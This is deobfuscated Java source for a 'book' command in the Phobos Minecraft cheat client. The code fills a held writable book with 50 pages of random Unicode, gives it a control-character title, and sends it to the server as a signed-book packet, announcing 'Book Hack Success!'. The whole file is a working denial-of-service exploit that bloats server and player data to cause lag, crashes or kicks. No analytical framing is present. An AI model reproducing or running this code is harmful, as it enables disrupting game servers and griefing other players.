//Deobfuscated with https://github.com/PetoPetko/Minecraft-Deobfuscator3000 using mappings "1.12 stable mappings"!

package me.earth.phobos.features.command.commands;

import io.netty.buffer.Unpooled;
import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import me.earth.phobos.Phobos;
import me.earth.phobos.features.command.Command;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.CPacketCustomPayload;

public class BookCommand extends Command {
  public BookCommand() {
    super("book", new String[0]);
  }
  
  public void execute(String[] commands) {
    ItemStack heldItem = mc.player.getHeldItemMainhand();
    if (heldItem.getItem() == Items.WRITABLE_BOOK) {
      int limit = 50;
      Random rand = new Random();
      IntStream characterGenerator = rand.ints(128, 1112063).map(i -> (i < 55296) ? i : (i + 2048));
      String joinedPages = characterGenerator.limit(10500L).<CharSequence>mapToObj(i -> String.valueOf((char)i)).collect(Collectors.joining());
      NBTTagList pages = new NBTTagList();
      for (int page = 0; page < 50; page++)
        pages.appendTag((NBTBase)new NBTTagString(joinedPages.substring(page * 210, (page + 1) * 210))); 
      if (heldItem.hasTagCompound()) {
        heldItem.getTagCompound().setTag("pages", (NBTBase)pages);
      } else {
        heldItem.setTagInfo("pages", (NBTBase)pages);
      } 
      StringBuilder stackName = new StringBuilder();
      for (int i = 0; i < 16; i++)
        stackName.append("\024\f"); 
      heldItem.setTagInfo("author", (NBTBase)new NBTTagString(mc.player.getName()));
      heldItem.setTagInfo("title", (NBTBase)new NBTTagString(stackName
            
            .toString()));
      PacketBuffer buf = new PacketBuffer(Unpooled.buffer());
      buf.writeItemStack(heldItem);
      mc.player.connection.sendPacket((Packet)new CPacketCustomPayload("MC|BSign", buf));
      sendMessage(Phobos.commandManager.getPrefix() + "Book Hack Success!");
    } else {
      sendMessage(Phobos.commandManager.getPrefix() + "b1g 3rr0r!");
    } 
  }
}
